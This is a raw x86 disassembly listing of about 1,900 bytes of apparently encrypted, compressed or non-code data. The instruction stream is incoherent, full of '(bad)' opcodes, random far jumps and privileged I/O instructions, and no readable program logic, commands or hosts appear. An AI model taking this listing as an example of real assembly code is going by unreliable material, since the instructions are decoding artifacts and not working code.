  40c9f5:	imul   esi,edi,0xbb13aa45
  40c9fb:	jl     0x40ca3e
  40c9fd:	mov    dh,0xd8
  40c9ff:	jmp    0x40ca3f
  40ca01:	mov    al,0xbd
  40ca03:	in     eax,0x74
  40ca05:	data16 aam 0xed
  40ca08:	bound  esp,QWORD PTR [edx-0x546a3b99]
  40ca0e:	sub    edi,DWORD PTR [esi+0x12]
  40ca11:	ret    0xa464
  40ca14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca15:	leave  
  40ca16:	fst    QWORD PTR [eax+0x29e49c99]
  40ca1c:	pop    edx
  40ca1d:	cmp    dh,BYTE PTR [edi]
  40ca1f:	or     edx,ebx
  40ca21:	ds jae 0x40ca57
  40ca24:	jge    0x40c9ec
  40ca26:	mov    cl,0x36
  40ca28:	mov    ebx,eax
  40ca2a:	test   dl,0xd9
  40ca2d:	push   es
  40ca2e:	shl    ecx,0xdf
  40ca31:	fldcw  WORD PTR [eax+0x662cc8a5]
  40ca37:	loopne 0x40ca16
  40ca39:	loope  0x40ca59
  40ca3b:	push   edx
  40ca3c:	sbb    bl,BYTE PTR [esp+edx*8-0x41]
  40ca40:	je     0x40ca75
  40ca42:	in     eax,0x59
  40ca44:	loop   0x40ca7f
  40ca46:	repnz cmp esp,DWORD PTR [esi-0x34]
  40ca4a:	inc    edi
  40ca4b:	cmp    bh,0xe7
  40ca4e:	sub    eax,0x835b29e7
  40ca53:	popf   
  40ca54:	xchg   edx,eax
  40ca55:	js     0x40ca8e
  40ca57:	adc    DWORD PTR [esi],esp
  40ca59:	add    eax,DWORD PTR [edi]
  40ca5b:	ss test eax,0x6063e5a1
  40ca61:	cmp    DWORD PTR [ebp-0x63f7c088],ecx
  40ca67:	sub    ebp,DWORD PTR [ecx]
  40ca69:	mov    edi,DWORD PTR [esi-0x21]
  40ca6c:	sbb    DWORD PTR [ecx],ebp
  40ca6e:	adc    DWORD PTR [ecx-0x37d5f194],0xb4534b94
  40ca78:	push   ebx
  40ca79:	mov    ch,0xdb
  40ca7b:	adc    al,0xea
  40ca7d:	inc    eax
  40ca7e:	push   ebx
  40ca7f:	add    bl,BYTE PTR [eax-0x75]
  40ca82:	jae    0x40cab9
  40ca84:	sub    BYTE PTR [ebx-0x20],dh
  40ca87:	xchg   ebx,eax
  40ca88:	inc    edi
  40ca89:	inc    ecx
  40ca8a:	xchg   ecx,eax
  40ca8b:	mov    eax,0x478bfa7
  40ca90:	adc    DWORD PTR [ebp+0x2b],edx
  40ca93:	xor    BYTE PTR [ebx+edx*8+0x45],bh
  40ca97:	adc    DWORD PTR [ebp+0xa],ebp
  40ca9a:	scas   eax,DWORD PTR es:[edi]
  40ca9b:	xchg   edx,eax
  40ca9c:	sbb    al,0xa0
  40ca9e:	(bad)  
  40ca9f:	inc    di
  40caa1:	or     eax,0x8b19ec6d
  40caa6:	or     eax,0xfe2364e4
  40caab:	and    al,0x38
  40caad:	pop    ecx
  40caae:	hlt    
  40caaf:	sub    BYTE PTR [eax],bl
  40cab1:	mov    bh,0x99
  40cab3:	rcl    BYTE PTR [edi],0xa5
  40cab6:	cmp    eax,0xcb03bb7b
  40cabb:	add    DWORD PTR [eax],eax
  40cabd:	dec    ecx
  40cabe:	inc    edi
  40cabf:	fimul  WORD PTR [edx-0x7a]
  40cac2:	(bad)  [ebx-0x4d24a78c]
  40cac8:	sub    ebp,ecx
  40caca:	shl    DWORD PTR [edi+0x26],1
  40cacd:	inc    ecx
  40cace:	or     eax,0x699329c4
  40cad3:	xchg   edi,eax
  40cad4:	jmp    0x6f47:0x442d45e0
  40cadb:	mov    dl,0xd9
  40cadd:	mov    eax,0xa117efa2
  40cae2:	(bad)  
  40cae3:	fdivr  st(0),st
  40cae5:	out    0x3d,al
  40cae7:	jnp    0x40cae7
  40cae9:	adc    ch,BYTE PTR ds:0x4b3e4bfe
  40caef:	rcl    BYTE PTR [esi],1
  40caf1:	mov    esi,0xa78c8c56
  40caf6:	ficomp DWORD PTR [esi+0x19]
  40caf9:	push   edx
  40cafa:	std    
  40cafb:	inc    edx
  40cafc:	aas    
  40cafd:	and    BYTE PTR [edx],ah
  40caff:	push   edi
  40cb00:	adc    BYTE PTR [ecx+0x45],0xba
  40cb04:	fimul  WORD PTR [edx+esi*2-0x3d]
  40cb08:	test   DWORD PTR [esi],esp
  40cb0a:	nop
  40cb0b:	loopne 0x40cad2
  40cb0d:	sub    DWORD PTR [eax+0xfb1b6eb],esi
  40cb13:	inc    BYTE PTR [edi+eiz*8]
  40cb16:	sub    al,0x45
  40cb19:	mov    ds:0x77e17383,eax
  40cb1e:	fs repnz add ebp,0x62
  40cb23:	or     BYTE PTR [ebp-0x51],al
  40cb26:	pushf  
  40cb27:	(bad)  
  40cb29:	out    dx,al
  40cb2a:	fprem  
  40cb2c:	daa    
  40cb2d:	mov    dh,0xca
  40cb2f:	in     eax,0xe
  40cb31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb32:	jae    0x40cad1
  40cb34:	jnp    0x40cb5e
  40cb36:	and    al,0x55
  40cb38:	push   es
  40cb39:	js     0x40cb68
  40cb3b:	(bad)  
  40cb3c:	inc    esp
  40cb3d:	mov    ch,0xf6
  40cb3f:	scas   eax,DWORD PTR es:[edi]
  40cb40:	adc    eax,0x22b730fe
  40cb45:	xchg   esp,eax
  40cb46:	pop    ebp
  40cb47:	mov    esp,gs
  40cb49:	push   0x5a4fdc6b
  40cb4e:	test   esi,esp
  40cb50:	scas   eax,DWORD PTR es:[edi]
  40cb51:	je     0x40cba9
  40cb53:	mov    esi,0x8a60ec14
  40cb58:	ret    
  40cb59:	sub    al,0xd1
  40cb5b:	fs inc edi
  40cb5d:	cli    
  40cb5e:	sub    DWORD PTR es:[esi-0x1bec3478],0x7f
  40cb66:	mov    ah,0x81
  40cb68:	fidiv  DWORD PTR [eax-0xf0b6256]
  40cb6e:	out    0x4e,eax
  40cb70:	adc    DWORD PTR [ecx],esp
  40cb72:	es push ebx
  40cb74:	sbb    DWORD PTR [ebx],ebp
  40cb76:	inc    ebp
  40cb77:	repz inc esi
  40cb79:	(bad)  
  40cb7a:	scas   al,BYTE PTR es:[edi]
  40cb7b:	enter  0xcc47,0x2c
  40cb7f:	xchg   ecx,eax
  40cb80:	mov    bl,0xcd
  40cb82:	cmp    DWORD PTR [edx+0x7f8056a0],esi
  40cb88:	cdq    
  40cb89:	push   cs
  40cb8a:	lock mov ch,0x3f
  40cb8d:	(bad)
  40cb90:	pop    ebp
  40cb91:	pop    ecx
  40cb92:	ret    0xb0b5
  40cb95:	mov    ebp,0x90f94d21
  40cb9a:	fistp  WORD PTR ds:0x2fab9f04
  40cba0:	jmp    0x3333e7f6
  40cba5:	mov    edi,0xb86767ba
  40cbaa:	outs   dx,DWORD PTR ds:[esi]
  40cbab:	cmp    DWORD PTR [edi+0x492feae6],esp
  40cbb1:	fstp   QWORD PTR ds:0xe8691dac
  40cbb7:	hlt    
  40cbb8:	mov    eax,ds:0xb19528f4
  40cbbd:	and    esi,DWORD PTR [edi]
  40cbbf:	lea    esp,[edx-0x65]
  40cbc2:	popf   
  40cbc3:	nop
  40cbc4:	xchg   esp,eax
  40cbc5:	mov    dh,0x63
  40cbc7:	mov    ebp,0x5d14a34a
  40cbcc:	inc    DWORD PTR [ecx+0x2ec52b5d]
  40cbd2:	popa   
  40cbd3:	imul   edi,esp,0x553978ca
  40cbd9:	inc    eax
  40cbda:	jle    0x40cc31
  40cbdc:	adc    esp,DWORD PTR [ecx-0x5cb49564]
  40cbe2:	mov    ebx,0x2c55b5d
  40cbe7:	sub    eax,0x4c18f09a
  40cbec:	or     BYTE PTR [edi+eiz*2+0x8],ch
  40cbf0:	lahf   
  40cbf1:	js     0x40cb90
  40cbf3:	mov    BYTE PTR [ebx],ch
  40cbf5:	jecxz  0x40cbef
  40cbf7:	aam    0x8b
  40cbf9:	repz push edi
  40cbfb:	xchg   esi,eax
  40cbfc:	sbb    DWORD PTR [ebp+0x6b37a02a],edi
  40cc02:	addr16 out 0xf3,eax
  40cc05:	sub    BYTE PTR [esi-0x2f7fdd6d],0x1c
  40cc0c:	or     eax,0x4c2274e2
  40cc11:	jae    0x40cbe1
  40cc13:	jnp    0x40cbda
  40cc15:	loope  0x40cc4f
  40cc17:	ins    DWORD PTR es:[edi],dx
  40cc18:	cmp    DWORD PTR [eax-0x53bb5a29],ecx
  40cc1e:	neg    DWORD PTR [esi+0x5675ad24]
  40cc24:	js     0x40cc1a
  40cc26:	out    dx,al
  40cc27:	add    esi,eax
  40cc29:	lds    ecx,FWORD PTR [ecx+0x1623fff9]
  40cc2f:	ret    0x9cb3
  40cc32:	retf   0x11a3
  40cc35:	jle    0x40cc0f
  40cc37:	sbb    BYTE PTR [edi],dh
  40cc39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc3a:	sbb    ebp,DWORD PTR [edi]
  40cc3c:	jne    0x40cca1
  40cc3e:	mov    dh,0x1f
  40cc40:	fwait
  40cc41:	cli    
  40cc42:	jne    0x40ccb0
  40cc44:	mov    esp,0x82eccba0
  40cc49:	xchg   esi,eax
  40cc4a:	inc    ebx
  40cc4b:	call   0x8eb4303a
  40cc50:	sar    DWORD PTR [eax-0x15],cl
  40cc53:	retf   
  40cc54:	dec    esp
  40cc55:	add    ecx,DWORD PTR [edi]
  40cc57:	jp     0x40cc58
  40cc59:	clc    
  40cc5a:	addr16 pop esi
  40cc5c:	mov    ch,0xa1
  40cc5e:	inc    ebp
  40cc5f:	jmp    0x40cc33
  40cc61:	(bad)  
  40cc62:	icebp  
  40cc63:	or     esp,DWORD PTR [ecx+eax*2]
  40cc66:	jmp    0x6a5ba1cf
  40cc6b:	rcr    ebp,1
  40cc6d:	mov    ch,0xba
  40cc6f:	arpl   WORD PTR [bp+si-0xa],dx
  40cc73:	mov    edx,0xa8378659
  40cc78:	add    al,0xb0
  40cc7a:	and    DWORD PTR [ebx+0x4b],edx
  40cc7d:	icebp  
  40cc7e:	jo     0x40cca3
  40cc80:	jbe    0x40cc25
  40cc82:	nop
  40cc83:	pop    esp
  40cc84:	adc    dh,BYTE PTR [esi+0x41]
  40cc87:	mov    esp,0xef6671b9
  40cc8c:	xchg   ecx,eax
  40cc8d:	inc    ecx
  40cc8e:	clc    
  40cc8f:	push   esp
  40cc90:	cs scas eax,DWORD PTR es:[edi]
  40cc92:	mov    cl,0x13
  40cc94:	xchg   esp,eax
  40cc95:	fs cmp eax,0x42128e7b
  40cc9b:	pop    eax
  40cc9c:	test   ah,dh
  40cc9e:	sti    
  40cc9f:	stos   DWORD PTR es:[di],eax
  40cca1:	cld    
  40cca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cca3:	jne    0x40cd14
  40cca5:	pop    ecx
  40cca6:	mov    ecx,0xfc52520b
  40ccab:	and    eax,0xa52efcff
  40ccb0:	or     al,0x75
  40ccb2:	xor    al,0x55
  40ccb4:	pop    ecx
  40ccb5:	mov    esp,0x7d298fcc
  40ccba:	imul   esp,esp,0x6a201b68
  40ccc0:	and    eax,0x8bbab7ec
  40ccc5:	aad    0x1d
  40ccc7:	je     0x40cc87
  40ccc9:	lods   eax,DWORD PTR ds:[esi]
  40ccca:	mov    edx,0xc33d0010
  40cccf:	sbb    DWORD PTR [ebp-0x4633e4b2],0xffffffc7
  40ccd6:	out    0xb7,eax
  40ccd8:	lahf   
  40ccd9:	outs   dx,BYTE PTR ds:[esi]
  40ccda:	call   0xfb76f56
  40ccdf:	dec    ebp
  40cce0:	(bad)  
  40cce1:	jle    0x40cc8b
  40cce3:	xor    cl,BYTE PTR [ebp+0x47]
  40cce6:	fucomip st,st(7)
  40cce8:	adc    eax,0xa8fe97a1
  40cced:	xor    al,0x72
  40ccef:	cdq    
  40ccf0:	lods   eax,DWORD PTR ds:[esi]
  40ccf1:	stc    
  40ccf2:	lds    esi,FWORD PTR [ebx+0x416ef50f]
  40ccf8:	cld    
  40ccf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccfa:	mov    bh,0xf6
  40ccfc:	(bad)  
  40ccfd:	loope  0x40cd29
  40ccff:	inc    esp
  40cd00:	inc    edx
  40cd01:	or     al,bl
  40cd03:	or     BYTE PTR ds:0xf7dbcb54,dl
  40cd09:	xchg   edx,eax
  40cd0a:	sbb    eax,0x91ff43d
  40cd0f:	sub    esp,ecx
  40cd11:	xor    al,0x63
  40cd13:	fadd   st,st(7)
  40cd15:	fstp   TBYTE PTR ds:0x4ac1077c
  40cd1b:	sahf   
  40cd1c:	outs   dx,DWORD PTR ds:[si]
  40cd1e:	xchg   BYTE PTR [ebx+ebp*1-0x1dc6f3e2],dh
  40cd25:	mov    dh,0x92
  40cd27:	retf   0x581
  40cd2a:	inc    esi
  40cd2b:	in     al,dx
  40cd2c:	push   cs
  40cd2d:	popf   
  40cd2e:	push   edi
  40cd2f:	jbe    0x40ccc8
  40cd31:	mov    ch,0xf
  40cd33:	out    dx,al
  40cd34:	idiv   BYTE PTR [esi-0x46]
  40cd37:	mov    BYTE PTR [edx-0x228a0f56],cl
  40cd3d:	cs int 0x6d
  40cd40:	mov    bh,0x5c
  40cd42:	sub    dh,BYTE PTR [esi-0x6e40a9ac]
  40cd48:	mov    al,0x8e
  40cd4a:	pop    ds
  40cd4b:	jmp    0xa752:0x9dd012e0
  40cd52:	retf   0x52a9
  40cd55:	pop    esp
  40cd56:	arpl   WORD PTR [eax+0x502fdde5],di
  40cd5c:	push   ss
  40cd5d:	cvtdq2ps xmm3,XMMWORD PTR [edi+0x1b]
  40cd61:	fdiv   DWORD PTR [esi]
  40cd63:	push   ss
  40cd64:	jns    0x40cd39
  40cd66:	dec    eax
  40cd67:	sbb    al,0x19
  40cd69:	stos   BYTE PTR es:[edi],al
  40cd6a:	or     al,0x51
  40cd6c:	enter  0x8f10,0xe8
  40cd70:	(bad)  
  40cd71:	xor    cl,BYTE PTR [esi-0x20]
  40cd74:	push   cs
  40cd75:	jg     0x40cd07
  40cd77:	iret   
  40cd78:	cmc    
  40cd79:	cmp    ch,bl
  40cd7b:	scas   al,BYTE PTR es:[edi]
  40cd7c:	sub    bl,BYTE PTR [eax+0x4b6d6ae6]
  40cd82:	shl    DWORD PTR [ebx+edi*4+0x302eb771],1
  40cd89:	sbb    eax,0x9b556996
  40cd8e:	imul   esp,DWORD PTR [edx],0xe30b32ce
  40cd94:	xchg   edi,eax
  40cd95:	pop    ebp
  40cd96:	or     DWORD PTR [ecx-0xdbcdb3a],ebx
  40cd9c:	daa    
  40cd9d:	push   ebp
  40cd9e:	hlt    
  40cd9f:	sub    eax,0xa292b199
  40cda4:	out    dx,al
  40cda5:	xchg   esp,eax
  40cda6:	retf   0x3317
  40cda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdaa:	loope  0x40ce27
  40cdac:	(bad)  
  40cdad:	retf   
  40cdae:	mov    al,ds:0x9da7a971
  40cdb3:	in     eax,dx
  40cdb4:	pop    edx
  40cdb5:	gs stos BYTE PTR es:[edi],al
  40cdb7:	lods   eax,DWORD PTR ds:[esi]
  40cdb8:	inc    edx
  40cdb9:	clc    
  40cdba:	dec    ebp
  40cdbb:	sbb    ebx,ebp
  40cdbd:	pop    ebx
  40cdbe:	adc    eax,0xf140ac91
  40cdc3:	adc    BYTE PTR [ebx+0x4a],bl
  40cdc6:	rcr    ah,0xc1
  40cdc9:	(bad)  
  40cdca:	popf   
  40cdcb:	fild   DWORD PTR [eax+esi*8]
  40cdce:	test   BYTE PTR ds:0xca030770,0x7e
  40cdd5:	rcl    BYTE PTR [esi+ecx*1-0x42],1
  40cdd9:	pop    ds
  40cdda:	mov    esp,0x3e45c9bf
  40cddf:	cmp    BYTE PTR [edi+0x6b],0xa5
  40cde3:	out    0xff,al
  40cde5:	push   0xfffffffa
  40cde7:	or     DWORD PTR [ebx-0x7d],edi
  40cdea:	out    dx,eax
  40cdeb:	je     0x40cddc
  40cded:	ret    0xce2
  40cdf0:	cmp    bh,BYTE PTR [ecx-0x346e0a14]
  40cdf6:	adc    ch,dl
  40cdf8:	push   ds
  40cdf9:	mov    esi,DWORD PTR [eax]
  40cdfb:	dec    ecx
  40cdfc:	cwde   
  40cdfd:	push   0x50
  40cdff:	fdiv   QWORD PTR [esi-0x6fd36653]
  40ce05:	mov    dh,0x97
  40ce07:	fadd   st,st(2)
  40ce09:	shl    esi,1
  40ce0b:	hlt    
  40ce0c:	adc    al,0xde
  40ce0e:	sub    DWORD PTR [ecx],esp
  40ce10:	jb     0x40ce48
  40ce12:	mov    bl,0xc9
  40ce14:	dec    eax
  40ce15:	lods   al,BYTE PTR ds:[esi]
  40ce16:	test   al,0x25
  40ce18:	fcmovne st,st(5)
  40ce1a:	mov    al,0x68
  40ce1c:	mov    eax,0xc57e5cb6
  40ce21:	inc    edx
  40ce22:	retf   
  40ce23:	cmp    BYTE PTR ds:0x80395f34,bl
  40ce29:	ret    0xeef0
  40ce2c:	add    al,0x19
  40ce2e:	ret    0x562d
  40ce31:	xor    al,0x84
  40ce33:	sbb    eax,0xf3778a05
  40ce38:	mov    esp,0xf4cb95f1
  40ce3d:	add    ch,BYTE PTR [ebx-0x3d]
  40ce40:	repnz jmp 0x2cd:0x516ecc9e
  40ce48:	or     BYTE PTR [esi],0x18
  40ce4b:	cs sbb al,0x16
  40ce4e:	jbe    0x40cdd3
  40ce50:	pop    edx
  40ce51:	dec    esp
  40ce52:	retf   
  40ce53:	cmp    ch,BYTE PTR [esi+0x29]
  40ce56:	jmp    0x40ceb6
  40ce58:	inc    edi
  40ce59:	lahf   
  40ce5a:	mov    BYTE PTR [ebp+0x49],bh
  40ce5d:	dec    edi
  40ce5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce5f:	xor    al,dl
  40ce61:	in     eax,dx
  40ce62:	xlat   BYTE PTR ds:[ebx]
  40ce63:	sahf   
  40ce64:	loope  0x40ce93
  40ce66:	sbb    ax,0xdf82
  40ce6a:	sbb    BYTE PTR [eax+ecx*4],al
  40ce6d:	cmp    al,0xe1
  40ce6f:	dec    eax
  40ce70:	jmp    0x7e910de4
  40ce75:	inc    esi
  40ce76:	shr    BYTE PTR [ebp-0xa],0xf1
  40ce7a:	ret    
  40ce7b:	and    BYTE PTR [eax-0x343a0ea5],dh
  40ce81:	adc    eax,0xc885a498
  40ce86:	out    dx,al
  40ce87:	jnp    0x40ce2f
  40ce89:	aad    0xb9
  40ce8b:	ds or  eax,0xf39b870c
  40ce91:	loop   0x40cec1
  40ce93:	xor    BYTE PTR [esi],dh
  40ce95:	fwait
  40ce96:	and    ch,BYTE PTR [ebx]
  40ce98:	fisub  DWORD PTR [ebp-0x54ab8f86]
  40ce9e:	push   ss
  40ce9f:	dec    edx
  40cea0:	jecxz  0x40ceed
  40cea2:	imul   esi,DWORD PTR [ecx],0xffffff98
  40cea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cea6:	jo     0x40cef7
  40cea8:	pop    ebx
  40cea9:	std    
  40ceaa:	mov    DWORD PTR gs:0x3814981e,edx
  40ceb1:	fs pop eax
  40ceb3:	sub    al,BYTE PTR [edi]
  40ceb5:	in     eax,0xc7
  40ceb7:	dec    ebp
  40ceb8:	test   eax,0x441a1e8e
  40cebd:	add    ebp,DWORD PTR [ebx+0x75567baa]
  40cec3:	jb     0x40ce54
  40cec5:	push   ds
  40cec6:	and    eax,0xb40fb532
  40cecb:	or     esp,DWORD PTR [ecx+0x2d6cba2b]
  40ced1:	je     0x40ce58
  40ced3:	jmp    0xd0ab69b0
  40ced8:	inc    eax
  40ced9:	mov    dh,0x5b
  40cedb:	jmp    0xbea0cee7
  40cee0:	int3   
  40cee1:	call   0xbbc1:0xbb5112e3
  40cee8:	(bad)  
  40cee9:	out    dx,al
  40ceea:	shl    DWORD PTR [edi+0x1e6df06],cl
  40cef0:	pop    esp
  40cef1:	sti    
  40cef2:	in     eax,dx
  40cef3:	push   ecx
  40cef4:	mov    BYTE PTR gs:[esi-0x60],cl
  40cef8:	xchg   esp,eax
  40cef9:	nop
  40cefa:	mov    fs,WORD PTR [edi+0x7b]
  40cefd:	mov    BYTE PTR [eax-0x80],dh
  40cf00:	popa   
  40cf01:	cli    
  40cf02:	test   BYTE PTR [edx+0x2a],bh
  40cf05:	mov    eax,ds:0x3f8d243c
  40cf0a:	pmulhuw mm2,QWORD PTR [ebx+eax*4+0x79]
  40cf0f:	adc    ch,al
  40cf11:	push   ebx
  40cf12:	add    DWORD PTR [edi-0x562ce9f1],0x7344459d
  40cf1c:	cmp    cl,BYTE PTR [ecx]
  40cf1e:	in     al,dx
  40cf1f:	loope  0x40cecc
  40cf21:	aas    
  40cf22:	fldcw  WORD PTR [ebp-0x3f]
  40cf25:	mov    esp,0xefc15dc8
  40cf2a:	nop
  40cf2b:	xor    ch,BYTE PTR [esi]
  40cf2d:	mov    eax,0x8d0c0903
  40cf32:	xchg   ebx,eax
  40cf33:	sub    al,BYTE PTR [edi+0x68ba7b3c]
  40cf39:	and    BYTE PTR [eax+0x537e58d0],0xf4
  40cf40:	mov    al,0xff
  40cf42:	in     eax,0x59
  40cf44:	into   
  40cf45:	lea    eax,[esi+0x7f323d81]
  40cf4b:	add    ecx,edi
  40cf4d:	popa   
  40cf4e:	inc    eax
  40cf4f:	sbb    cl,bl
  40cf51:	jb     0x40cf8a
  40cf53:	pinsrw mm3,WORD PTR [ebx],0xe0
  40cf57:	push   cs
  40cf58:	fwait
  40cf59:	push   es
  40cf5a:	(bad)  
  40cf5b:	outs   dx,DWORD PTR ds:[esi]
  40cf5c:	mov    edi,0x43a92466
  40cf61:	mov    eax,0x728af0f9
  40cf66:	inc    ebp
  40cf67:	mov    eax,ds:0x565cc171
  40cf6c:	jo     0x40cf24
  40cf6e:	jae    0x40cfdc
  40cf70:	mov    ch,dh
  40cf72:	inc    ebp
  40cf73:	out    0x4a,al
  40cf75:	add    DWORD PTR [ecx-0x6968e988],ecx
  40cf7b:	shl    cl,cl
  40cf7d:	push   es
  40cf7e:	imul   edi,DWORD PTR [ebx],0xffffff85
  40cf81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf82:	pop    edx
  40cf83:	push   ss
  40cf84:	mov    eax,0xe49c7abd
  40cf89:	in     al,0x74
  40cf8b:	bound  edx,QWORD PTR [eax-0x443cf257]
  40cf91:	mov    eax,0x82529fe3
  40cf96:	pop    ds
  40cf97:	mov    ecx,0x2a5ca9f7
  40cf9c:	inc    eax
  40cf9d:	sub    esi,DWORD PTR [esi+edi*2+0x1289d4b1]
  40cfa4:	ins    BYTE PTR es:[edi],dx
  40cfa5:	adc    BYTE PTR gs:0x89411d74,dh
  40cfac:	test   BYTE PTR [ebx],0xd8
  40cfaf:	or     BYTE PTR [edx-0x40],ch
  40cfb2:	data16 jle 0x40cf4d
  40cfb5:	dec    esi
  40cfb6:	jmp    0x3163:0xf5cd666d
  40cfbd:	push   eax
  40cfbe:	adc    bl,BYTE PTR [eax+0x32]
  40cfc1:	mov    BYTE PTR [esi-0x4a],al
  40cfc4:	sbb    DWORD PTR [ebp+eax*8-0x39],eax
  40cfc8:	fisttp DWORD PTR [eax+0x54]
  40cfcb:	mov    al,ds:0x3457760e
  40cfd0:	pop    eax
  40cfd1:	leave  
  40cfd2:	je     0x40cff3
  40cfd4:	in     eax,dx
  40cfd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfd6:	aam    0x2e
  40cfd8:	jnp    0x40d040
  40cfda:	test   ax,0x6ef4
  40cfde:	mov    dh,0xb0
  40cfe0:	or     DWORD PTR [ecx+esi*4],edi
  40cfe3:	repnz ficom WORD PTR [ecx+0x2c]
  40cfe7:	inc    esp
  40cfe8:	add    dl,ah
  40cfea:	cmp    al,0x7
  40cfec:	loope  0x40d025
  40cfee:	add    al,0xc4
  40cff0:	cmp    eax,0x8ab95c1d
  40cff5:	rcl    BYTE PTR [esi-0x2cd45bd7],cl
  40cffb:	ret    0x9ab3
  40cffe:	shr    BYTE PTR [ebx],cl
  40d000:	js     0x40d042
  40d002:	dec    ebp
  40d003:	push   ebp
  40d004:	mov    dh,0xc4
  40d006:	sub    esp,DWORD PTR [ebx-0x3af6b632]
  40d00c:	mov    bh,0xeb
  40d00e:	aad    0x7e
  40d010:	int    0x70
  40d012:	add    al,0x44
  40d014:	cmp    BYTE PTR [esi+0x3db23225],bl
  40d01a:	xchg   esp,eax
  40d01b:	aad    0x8a
  40d01d:	xchg   ebp,eax
  40d01e:	pop    esp
  40d01f:	cdq    
  40d020:	sub    edx,DWORD PTR [edi+0x35f7feec]
  40d026:	push   ebp
  40d027:	nop
  40d028:	call   0x57ac:0x37d31aa7
  40d02f:	retf   0x9e3f
  40d032:	add    BYTE PTR [ebx+0x223bf96],ch
  40d038:	je     0x40cffc
  40d03a:	xchg   ecx,eax
  40d03b:	xchg   ebx,eax
  40d03c:	and    BYTE PTR [edi+0x14],bh
  40d03f:	mov    ch,0x7d
  40d041:	ins    BYTE PTR es:[edi],dx
  40d042:	in     eax,dx
  40d043:	nop
  40d044:	cld    
  40d045:	jae    0x40d0a5
  40d047:	mov    dl,0x25
  40d049:	inc    edi
  40d04a:	repz or DWORD PTR [ebx+0x171ab4f8],esi
  40d051:	sub    al,0x8b
  40d053:	out    dx,eax
  40d054:	sbb    al,0x1b
  40d056:	mov    ebx,0xd7394d81
  40d05b:	and    BYTE PTR [ebp+0x2b051b99],bh
  40d061:	xchg   edi,eax
  40d062:	mov    eax,0x5fe848cd
  40d067:	pop    ebx
  40d068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d069:	in     al,dx
  40d06a:	mov    dh,0xeb
  40d06c:	xchg   esp,eax
  40d06d:	loope  0x40d080
  40d06f:	pop    ecx
  40d070:	sbb    DWORD PTR [esi+0x3b],esp
  40d073:	and    BYTE PTR [ecx-0x76eb5787],ah
  40d079:	fidiv  WORD PTR [eax-0xc]
  40d07c:	(bad)  
  40d07d:	or     edx,DWORD PTR [eax+ebx*2]
  40d080:	mov    esi,0xd76f6708
  40d085:	xchg   ch,ah
  40d087:	push   es
  40d088:	push   ss
  40d089:	iret   
  40d08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d08b:	mov    ds:0x1d3bf424,al
  40d090:	mov    DWORD PTR [ebx+0x7905190e],edi
  40d096:	test   eax,0x8e5d60e6
  40d09b:	jmp    0x39c89672
  40d0a0:	lea    ebp,[ecx]
  40d0a2:	mov    esi,0xb1067907
  40d0a7:	xor    DWORD PTR [edi-0x7d],esp
  40d0aa:	bound  ecx,QWORD PTR [edx-0x4ac2face]
  40d0b0:	mov    DWORD PTR [edx-0x29a12d35],ecx
  40d0b6:	aad    0x6b
  40d0b8:	ret    
  40d0b9:	mov    cl,0x5e
  40d0bb:	sub    esi,ebx
  40d0bd:	icebp  
  40d0be:	jl     0x40d086
  40d0c0:	push   ebx
  40d0c1:	and    al,0x2e
  40d0c3:	popa   
  40d0c4:	xchg   ebx,eax
  40d0c5:	call   0x5ffb779b
  40d0ca:	mov    ebp,0x792a01f2
  40d0cf:	mov    ds:0x3a9e6f2a,eax
  40d0d4:	(bad)  
  40d0d5:	pusha  
  40d0d6:	push   edi
  40d0d7:	repnz push ecx
  40d0d9:	scas   eax,DWORD PTR es:[edi]
  40d0da:	or     bl,ah
  40d0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0dd:	sbb    al,0xb7
  40d0df:	iret   
  40d0e0:	sub    al,0x20
  40d0e2:	xor    BYTE PTR [edi],bh
  40d0e4:	sub    BYTE PTR [esi-0x6b85a743],0xa6
  40d0eb:	lock fs xchg edx,eax
  40d0ee:	mov    ecx,0x751feb7c
  40d0f3:	dec    ebp
  40d0f4:	pop    ecx
  40d0f5:	push   eax
  40d0f6:	daa    
  40d0f7:	popa   
  40d0f8:	ret    
  40d0f9:	mov    bl,0x4f
  40d0fb:	push   eax
  40d0fc:	mov    ah,0x17
  40d0fe:	stos   BYTE PTR es:[edi],al
  40d0ff:	push   0x3f1cebfb
  40d104:	loope  0x40d146
  40d106:	repnz adc eax,0x3ee44afe
  40d10c:	scas   eax,DWORD PTR es:[edi]
  40d10d:	sub    eax,0x527a8ebd
  40d112:	xchg   eax,ecx
  40d114:	retf   
  40d115:	sbb    ebp,DWORD PTR [ebx]
  40d117:	hlt    
  40d118:	sbb    BYTE PTR [edi+0x721426a],ch
  40d11e:	ds sbb dl,ch
  40d121:	cli    
  40d122:	adc    al,0xc4
  40d124:	rcr    DWORD PTR [esi],0xb2
  40d127:	out    0x71,eax
  40d129:	add    ch,BYTE PTR [esi-0x68342c0d]
  40d12f:	jp     0x40d122
  40d131:	mov    esi,eax
  40d133:	mov    ds:0x440872c5,al
  40d138:	and    eax,0x3140220e
  40d13d:	mov    eax,gs
  40d13f:	push   0xf18c7adb
  40d144:	mov    ecx,0xde19152f
  40d149:	repz mov WORD PTR [ebx+0x327d07ad],?
  40d150:	shl    DWORD PTR [edi-0x5347103d],0xff
  40d157:	and    eax,0x34645b8f
  40d15c:	dec    esi
  40d15d:	fs mov dl,0xe2
  40d160:	mov    ecx,0x9fee7a1f
  40d165:	je     0x40d160
  40d167:	xchg   ecx,eax
  40d168:	mov    dl,0xd1
  40d16a:	retf   
  40d16b:	ret    0xc030
  40d16e:	je     0x40d198
  40d170:	icebp  
  40d171:	push   esp
  40d172:	ja     0x40d1cf
  40d174:	or     DWORD PTR [edi-0x6ff728ee],esi
  40d17a:	adc    BYTE PTR [esi-0x65],0xe7
  40d17e:	jns    0x40d1f8
  40d180:	dec    edx
  40d181:	push   0x38884cc4
  40d186:	xchg   edx,eax
